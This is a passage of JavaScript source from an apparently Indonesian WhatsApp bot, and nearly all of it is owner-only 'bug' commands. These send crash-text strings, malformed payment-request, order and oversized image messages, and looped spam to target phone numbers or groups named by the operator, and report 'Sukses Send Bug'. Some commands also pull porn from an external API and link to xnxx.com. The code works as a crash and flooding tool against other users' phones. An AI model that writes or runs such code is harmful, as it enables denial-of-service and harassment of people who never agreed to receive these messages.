{ callButton: { displayText: `P`, phoneNumber: ``}},
{ callButton: { displayText: `P`, phoneNumber: ``}},
{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
]})
}
}
 break
case "buttonimg": {
if (!isCreator) return onlyOwner()
if (args.length == 0) return setReply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Zyren`
for (let i = 0; i < jumlah; i++) {
let buttons = [
{buttonId: `🔥🔥🔥`, buttonText: { displayText: `𝐓𝐡𝐞 𝐍𝐯𝐬 𝐈𝐧𝐅𝐢𝐧𝐢𝐭𝐲 🎭🔥 ${pen}` }, type: 1 },
{buttonId: `🤬🤬🤬`, buttonText: { displayText: `${notif4}` }, type: 1 },
{buttonId: `🥶🥶🥶`, buttonText: { displayText: `${notif3}` }, type: 1 },
]
let buttonMessage = {
image: thumb,
mimeType: "image/jpg",
caption: `YouTube: https://youtube.com/c/PakTzy`,
footer: copyright,
buttons: buttons,
headerType: 4
}
zyren.sendMessage(m.chat, buttonMessage, { quoted: kon })
}
setReply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
case "stpc": {
if (!isCreator) return onlyOwner()
if (args.length < 1) return setReply(`*Syntax Error!*\n\nUse : ${command} No|Amount spam|timer\nExample : ${command} 62xx@s.whatsapp.net|1|10s\n\n\ns = Second/Detik\n\n𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘`)
setReply(`Gass🔥`)
num = q.split("|")[0]
jumlah = q.split("|")[1]
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync("./media/gambarnye/thezyren.jpg") }, { upload: zyren.waUploadToServer })
var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"extendedTextMessage": {
"text": `${konf}${pen}`,
}
}}), { userJid: m.chat, quoted: doc})
await sleep(10000)
zyren.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
setReply(`Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`)
}
break
case "stgc": {
if (!isCreator) return onlyOwner()
if (args.length < 1) return setReply(`*Syntax Error!*\n\nUse : ${command} No|Amount spam|timer\nExample : ${command} 62xx@s.whatsapp.net|1|10s\n\n\ns = Second/Detik\n\n𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘`)
setReply(`Gass🔱`)
num = q.split("|")[0]
jumlah = q.split("|")[1]
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync("./media/gambarnye/thezyren.jpg") }, { upload: zyren.waUploadToServer })
var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"extendedTextMessage": {
"text": `${konf}${pen}`,
}
}}), { userJid: m.chat, quoted: doc})
zyren.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
await sleep(10000)
}
setReply(`Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`)
}
break
case "vaudio": {
if (!isCreator) return onlyOwner()
if (args.length == 0) return setReply(`Penggunaan ${prefix+command} Jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Zyren`
for (let i = 0; i < jumlah; i++) {
 nyong = fs.readFileSync("./basetzy/virtex/🍷꙰͜͡𝐏𝐚𝐤𝐓𝐳𝐲💸̷⃨⃛.mp3")
 zyren.sendMessage(m.chat, {audio: nyong, mimetype: "audio/mpeg", }, {quoted:tzy})
 }}
 break
case "pengsui": {
if (!isCreator) return onlyOwner()
if (args.length == 0) return setReply(`Penggunaan ${prefix+command} Jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Zyren`
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync("./media/gambarnye/thezyren.jpg") }, { upload: zyren.waUploadToServer })
var requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"extendedTextMessage": {
"text": `${pen}`,
}
}}), { userJid: m.chat, quoted: doc})
zyren.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}}
break
case "viospc+" : {
if (!isCreator) return onlyOwner()
if (args.length < 1) return setReply(`Nomor Target`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,"")+"@s.whatsapp.net"
a = await zyren.sendMessage(m.chat, {react: { text: "🥶", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
zyren.sendMessage(Pe, {text: `${pvz3}`}, {quoted:tzy})
await sleep(100)
zyren.sendMessage(Pe, {text: `${pvm3}`}, {quoted:tzy})
await sleep(100)
zyren.sendMessage(Pe, {text: `${funer}`}, {quoted:tzy})
await sleep(100)
zyren.sendMessage(Pe, {text: `${pv3m}`}, {quoted:tzy})
await sleep(100)
zyren.sendMessage(Pe, {text: `${lugia}`}, {quoted:tzy})
await sleep(100)
zyren.sendMessage(Pe, {text: `${malvadinha}`}, {quoted:tzy})
await sleep(100)
zyren.sendMessage(Pe, {text: `${explosion}`}, {quoted:tzy})
await sleep(100)
zyren.sendMessage(Pe, {text: `${parando}`}, {quoted:tzy})
await sleep(100)
zyren.sendMessage(Pe, {text: `${killed}`}, {quoted:tzy})
await sleep(100)
zyren.sendMessage(Pe, {text: `${cova}`}, {quoted:tzy})
await sleep(100)
zyren.sendMessage(Pe, {text: `${sumiu}`}, {quoted:tzy})
await sleep(100)
zyren.sendMessage(Pe, {text: `${destroi}`}, {quoted:tzy})
await sleep(100)
zyren.sendMessage(Pe, {text: `${voids}`}, {quoted:tzy})
await sleep(100)
zyren.sendMessage(Pe, {text: `${explosionios}`}, {quoted:tzy})
await sleep(100)
}
break
case "viospc" : {
if (!isCreator) return onlyOwner()
if (args.length < 1) return setReply(`Nomor Target`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,"")+"@s.whatsapp.net"
a = await zyren.sendMessage(m.chat, {react: { text: "🥶", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
zyren.sendMessage(Pe, {text: `${pvz3}`}, {quoted:tzy})
await sleep(100)
zyren.sendMessage(Pe, {text: `${pvm3}`}, {quoted:tzy})
await sleep(100)
zyren.sendMessage(Pe, {text: `${funer}`}, {quoted:tzy})
await sleep(100)
zyren.sendMessage(Pe, {text: `${pv3m}`}, {quoted:tzy})
await sleep(100)
zyren.sendMessage(Pe, {text: `${lugia}`}, {quoted:tzy})
await sleep(100)
zyren.sendMessage(Pe, {text: `${malvadinha}`}, {quoted:tzy})
await sleep(100)
zyren.sendMessage(Pe, {text: `${explosion}`}, {quoted:tzy})
await sleep(100)
}
break
case "vandropc" : {
if (!isCreator) return onlyOwner()
if (args.length < 1) return setReply(`Nomor Target`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,"")+"@s.whatsapp.net"
a = await zyren.sendMessage(m.chat, {react: { text: "🥶", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
zyren.sendMessage(Pe, {text: `${parando}`}, {quoted:tzy})
await sleep(100)
zyren.sendMessage(Pe, {text: `${killed}`}, {quoted:tzy})
await sleep(100)
zyren.sendMessage(Pe, {text: `${cova}`}, {quoted:tzy})
await sleep(100)
zyren.sendMessage(Pe, {text: `${sumiu}`}, {quoted:tzy})
await sleep(100)
zyren.sendMessage(Pe, {text: `${destroi}`}, {quoted:tzy})
await sleep(100)
zyren.sendMessage(Pe, {text: `${voids}`}, {quoted:tzy})
await sleep(100)
zyren.sendMessage(Pe, {text: `${explosionios}`}, {quoted:tzy})
await sleep(100)
}
break

case "viosgc+" : {
if (!isCreator) return onlyOwner()
if (args.length < 1) return setReply(`Id Gc`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,"")+"@g.us"
a = await zyren.sendMessage(m.chat, {react: { text: "🥶", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
zyren.sendMessage(Pe, {text: `${pvz3}`}, {quoted:tzy})
await sleep(100)
zyren.sendMessage(Pe, {text: `${pvm3}`}, {quoted:tzy})
await sleep(100)
zyren.sendMessage(Pe, {text: `${funer}`}, {quoted:tzy})
await sleep(100)
zyren.sendMessage(Pe, {text: `${pv3m}`}, {quoted:tzy})
await sleep(100)
zyren.sendMessage(Pe, {text: `${lugia}`}, {quoted:tzy})
await sleep(100)
zyren.sendMessage(Pe, {text: `${malvadinha}`}, {quoted:tzy})
await sleep(100)
zyren.sendMessage(Pe, {text: `${explosion}`}, {quoted:tzy})
await sleep(100)
zyren.sendMessage(Pe, {text: `${parando}`}, {quoted:tzy})
await sleep(100)
zyren.sendMessage(Pe, {text: `${killed}`}, {quoted:tzy})
await sleep(100)
zyren.sendMessage(Pe, {text: `${cova}`}, {quoted:tzy})
await sleep(100)
zyren.sendMessage(Pe, {text: `${sumiu}`}, {quoted:tzy})
await sleep(100)
zyren.sendMessage(Pe, {text: `${destroi}`}, {quoted:tzy})
await sleep(100)
zyren.sendMessage(Pe, {text: `${voids}`}, {quoted:tzy})
await sleep(100)
zyren.sendMessage(Pe, {text: `${explosionios}`}, {quoted:tzy})
await sleep(100)
}
break
case "viosgc" : {
if (!isCreator) return onlyOwner()
if (args.length < 1) return setReply(`Id Gc`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,"")+"@g.us"
a = await zyren.sendMessage(m.chat, {react: { text: "🥶", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
zyren.sendMessage(Pe, {text: `${pvz3}`}, {quoted:tzy})
await sleep(100)
zyren.sendMessage(Pe, {text: `${pvm3}`}, {quoted:tzy})
await sleep(100)
zyren.sendMessage(Pe, {text: `${funer}`}, {quoted:tzy})
await sleep(100)
zyren.sendMessage(Pe, {text: `${pv3m}`}, {quoted:tzy})
await sleep(100)
zyren.sendMessage(Pe, {text: `${lugia}`}, {quoted:tzy})
await sleep(100)
zyren.sendMessage(Pe, {text: `${malvadinha}`}, {quoted:tzy})
await sleep(100)
zyren.sendMessage(Pe, {text: `${explosion}`}, {quoted:tzy})
await sleep(100)
}
break
case "vandrogc" : {
if (!isCreator) return onlyOwner()
if (args.length < 1) return setReply(`Id Gc`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,"")+"@g.us"
a = await zyren.sendMessage(m.chat, {react: { text: "🥶", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
zyren.sendMessage(Pe, {text: `${parando}`}, {quoted:tzy})
await sleep(100)
zyren.sendMessage(Pe, {text: `${killed}`}, {quoted:tzy})
await sleep(100)
zyren.sendMessage(Pe, {text: `${cova}`}, {quoted:tzy})
await sleep(100)
zyren.sendMessage(Pe, {text: `${sumiu}`}, {quoted:tzy})
await sleep(100)
zyren.sendMessage(Pe, {text: `${destroi}`}, {quoted:tzy})
await sleep(100)
zyren.sendMessage(Pe, {text: `${voids}`}, {quoted:tzy})
await sleep(100)
zyren.sendMessage(Pe, {text: `${explosionios}`}, {quoted:tzy})
await sleep(100)
}
break
case "vimgsw": {
if (!isCreator) return onlyOwner()
if (/image/.test(mime)) {
const fileName = fs.readdirSync("./media/sampahnye").length + 1
const media = await zyren.downloadAndSaveMediaMessage(quoted, `./media/sampahnye/${fileName}`)
zyren.sendMessage(m.chat, { image: {url: media}, caption: `${vimg}` }, { quoted: tzy })
}}
break
case "jadibugsw": {
if (isBan) return //sticBanLu(from)
if (!isCreator) return onlyOwner()
if (/image/.test(mime)) {
const fileName = fs.readdirSync("./media/sampahnye").length + 1
const media = await zyren.downloadAndSaveMediaMessage(quoted, `./media/sampahnye/${fileName}`)
zyren.sendMessage(m.chat, { image: {url: media}, caption: `[⫹⫺ - 㑒 ${q} ϟ〽️]\ 🦇̣̣̣̣̣̣̣̣⃟   ...𝛀..${mt3}` }, { quoted: tzy })
}}
break
case "vionce": {
if (!isCreator) return onlyOwner()
zyren.sendMessage(m.chat, { image: { url: "https://telegra.ph/file/842cc1a7658a1c2b94c0c.jpg" },viewOnce : true, caption: `${vimg}` }, { quoted: tzy })
}
break
case "vvonce": {
if (!isCreator) return onlyOwner()
if (/video/.test(mime)) {
const fileName = fs.readdirSync("./media/sampahnye").length + 1
const media = await zyren.downloadAndSaveMediaMessage(quoted, `./media/sampahnye/${fileName}`)
zyren.sendMessage(m.chat, {video: {url: media},viewOnce : true, caption: `${vimg}` },{quoted: tzy })
}
}
break
case "vvidsw":{
if (!isCreator) return onlyOwner()
dwhe = await getBuffer(`https://raku-web.herokuapp.com/api/bokep?apikey=RakuKeyTod`)
zyren.sendMessage(m.chat, { video: dwhe, mimetype: "video/mp4", fileName: `${command}.mp4`, caption: `${vimg}` }, { quoted: tzy })
}
break
case "vtag" : {
if (!isCreator) return onlyOwner()
zyren.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,"")+"@s.whatsapp.net", { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${q}`, currencyCodeIso4217: "IDR", requestFrom: "0@s.whatsapp.net", expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `🍷꙰͜͡𝐏𝐚𝐤𝐓𝐳𝐲💸̷⃨⃛️`,"body": `Selamat ${salam2} kak ${pushname}`,
mimetype: "audio/mpeg", caption: `${buttontzy}`,
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/PakTzy`,
thumbnailUrl: "https://telegra.ph/file/842cc1a7658a1c2b94c0c.jpg", 
thumbnail: logonya,
}
}}}}}, { quoted:doc})
setReply("Sukses Send Bug")}
break
case "troli4": {
if (!isCreator) return onlyOwner()
if (args.length == 0) return setReply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
a = await zyren.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
let dok = {key : {participant : "0@s.whatsapp.net"},message: {documentMessage: {title: `© ${ownerName}`,jpegThumbnail: thumb}}}
	var troli2 = generateWAMessageFromContent(m.chat,{
	"orderMessage": {
	"orderId": "599519108102353",
	"thumbnail": logonya,
	"itemCount": 1999,
	"status": "INQUIRY",
	"surface": "CATALOG",
	"message": " BY MR TZY ",
	"orderTitle": " BUG TROLI ", // 
	"sellerJid": "628199141094012@s.whatsapp.net",
	"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
	}
	},
	{quoted: {
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
	}, contextInfo:{}}) 
	zyren.relayMessage(m.chat, troli2.message, { messageId: troli2.key.id, a})
	}
	}
	break
	case "peswe": {
if (!isCreator) return onlyOwner()
let dok = {key : {participant : "0@s.whatsapp.net"},message: {documentMessage: {title: `© ${ownerName}`,jpegThumbnail: thumb}}}
	var image = generateWAMessageFromContent(m.chat,{
"imageMessage": {
					"url": "https://mmg.whatsapp.net/d/f/At7VrBdObWZY2de3bkRQHv71QT-OG1JpEu0ET91LvXf6.enc",
					"mimetype": "image/jpeg",
					"caption": "Done",
					"fileSha256": "5QgkzgrGdeS9fp4ZTKh6wAgUA66m6DT3FldlcSunWfU=",
					"fileLength": "161349999999999",
					"caption": `[⫹⫺ - 㑒 ❝𝐏𝐚𝐤 - 𝐓𝐳𝐲❞ - ★ 𝗪𝗔 ★ ϟ〽️]\ 🦇̣̣̣̣̣̣̣̣⃟   ...𝛀..𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦`,
					"height": 720,
					"width": 403,
					"mediaKey": "0WVIR9TC1RBQZ+hNZWUyayLzDHZ6FxJ3qlA77mS2IQM=",
					"fileEncSha256": "k6Aa66tGP2Vg3LS2R/bLIABBl/G2cIDgP6pdCw6sdRA=",
					"directPath": "/v/t62.7118-24/30927240_463639825803537_6955387786401142368_n.enc?ccb=11-4&oh=01_AVzwXBCI5iAFsXIfUnqLVYS96346tBWyTvoDmf9bK542GA&oe=63510937",
					"mediaKeyTimestamp": "16636898529999",
					"jpegThumbnail": logonya
	}
	},
	{quoted: {
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
	}, contextInfo:{}}) 
	zyren.relayMessage(m.chat, image.message, { messageId: image.key.id})
}
break
case "buglink":{
if (!isCreator) return onlyOwner()
if (args.length == 0) return setReply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
kontolu = "🍷꙰͜͡𝐏𝐚𝐤-𝐓𝐳𝐲💸̷⃨⃛️",
zyren.sendMessage(m.chat, {text: kontolu, thumbnail: thumb, quoted: m, contextInfo: { externalAdReply:{title: `${qpeh}`,body: `𝐏𝐫𝐢𝐝𝐞 - 𝐓𝐳𝐲 ϟ${mnth1}`,previewType:"PHOTO",thumbnail: thumb,sourceUrl:`https://xnxx.com`}}})
}
}
break
case "vweb":{
if (!isCreator) return onlyOwner()
if (args.length == 0) return setReply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
kontolu = "🔥፝⃟ ꙳𝐏𝐚𝐤𝐓𝐳𝐲🔥፝⃟   ",
zyren.sendMessage(m.chat, {text: kontolu, thumbnail: thumb, quoted: m, contextInfo: { externalAdReply:{title: `${konf}`,body: `𝐏𝐫𝐢𝐝𝐞 - 𝐓𝐳𝐲 ϟ${mnth}`,previewType:"PHOTO",thumbnail: thumb,sourceUrl:`https://xnxx.com`}}})
}
}
break
case "vgt":{
if (!isCreator) return onlyOwner()
if (args.length == 0) return setReply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
kontolu = "🔥፝⃟ ꙳𝐏𝐚𝐤𝐓𝐳𝐲🔥፝⃟   ",
zyren.sendMessage(m.chat, {text: kontolu, thumbnail: thumb, quoted: m, contextInfo: { externalAdReply:{title: `${konf}`,body: `𝐏𝐫𝐢𝐝𝐞 - 𝐓𝐳𝐲 ϟ${mnth}`,previewType:"PHOTO",thumbnail: thumb,sourceUrl:`https://xnxx.com${mnth1}`}}})
}
}
break
case "vgs":{
if (!isCreator) return onlyOwner()
if (args.length == 0) return setReply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
kontolu = "🔥፝⃟ ꙳𝐏𝐚𝐤𝐓𝐳𝐲🔥፝⃟   ",
zyren.sendMessage(m.chat, {text: kontolu, thumbnail: thumb, quoted: m, contextInfo: { externalAdReply:{title: `㑒 𝐏𝐚𝐤 - 𝐓𝐳𝐲 ϟ〽️`,body: `𝐏𝐫𝐢𝐝𝐞 - 𝐓𝐳𝐲 ϟ${mnth}`,previewType:"PHOTO",thumbnail: thumb,sourceUrl:`https://xnxx.com${mnth1}`}}})
}
}
break
break
case "jdfjjfjde": {
if (isBan) return //sticBanLu(from)
if (!m.isGroup) return onlyGroup()
zyren.sendMessage(m.chat,  { text : q ? q : "`\`\`\`「 ⚠️ Perhatian ⚠️ 」\`\`\`\n\nFitur Ini Telah Di Aktifkan!!`" , mentions: participants.map(a => a.id)}, { quoted: pak })
}
break
case "jejrjfjeir" : {
if (isBan) return //sticBanLu(from)
if (!m.isGroup) return onlyGroup()
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,"")+"@g.us"
a = await zyren.sendMessage(m.chat, {react: { text: "🥶️", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
zyren.sendMessage(Pe, {text: "Fitur Off!!"}, {quoted: a})
await sleep(10000)
}
break
case "bugreacpc" : {
if (!isCreator) return onlyOwner()
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,"")+"@s.whatsapp.net"
a = await zyren.sendMessage(m.chat, {react: { text: "🥶", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
zyren.sendMessage(Pe, {text: "𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘"}, {quoted: a})
await sleep(10000)
zyren.sendMessage(Pe, {text: "🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥"}, {quoted: a})
await sleep(10000)
zyren.sendMessage(Pe, {text: "𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘"}, {quoted: a})
await sleep(10000)
zyren.sendMessage(Pe, {text: "🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥"}, {quoted: a})
await sleep(10000)
zyren.sendMessage(Pe, {text: "𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘"}, {quoted: a})
await sleep(10000)
zyren.sendMessage(Pe, {text: "🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥"}, {quoted: a})
await sleep(10000)
